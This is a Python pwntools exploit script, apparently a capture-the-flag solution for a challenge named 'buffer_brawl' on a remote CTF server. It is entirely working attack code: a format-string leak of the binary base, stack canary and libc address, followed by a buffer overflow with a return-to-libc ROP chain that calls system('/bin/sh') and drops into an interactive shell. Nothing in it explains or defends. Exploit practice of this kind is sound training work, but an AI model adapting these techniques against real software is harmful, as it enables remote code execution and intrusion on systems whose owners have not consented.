#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./buffer_brawl_patched')
libc = ELF('./libc.so.6')

# p = process('./buffer_brawl_patched')
p = remote('buffer-brawl.chal.wwctf.com', 1337)
p.sendlineafter(b'> ', b'4')
p.sendafter(b'left?\n', b'%12$p\n%11$p')
code_base = int(p.recvline()[:-1], 16) - 9440
canary = int(p.recvline()[:-1], 16)
log.info(hex(code_base))
log.info(hex(canary))

read_got = code_base + elf.got["read"]
payload = b'%7$s' + b'\x00' * 4 + p64(read_got)
p.sendlineafter(b'> ', b'4')
p.sendafter(b'left?\n', payload)
leak = u64(p.recvn(6) + b'\x00' * 2) - libc.symbols["read"]
log.info(hex(leak))

for i in range(29):
    p.sendlineafter(b'> ', b'3')

pop_rdi = leak + 0x000000000002a3e5
ret = leak + 0x0000000000029139
system = leak + libc.symbols["system"]
bin_sh = leak + 0x00000000001d8678
payload = b'A' * 0x18 + p64(canary)
payload += b'A' * 0x8 
payload += p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)

p.sendlineafter(b'move: \n', payload)

p.interactive()
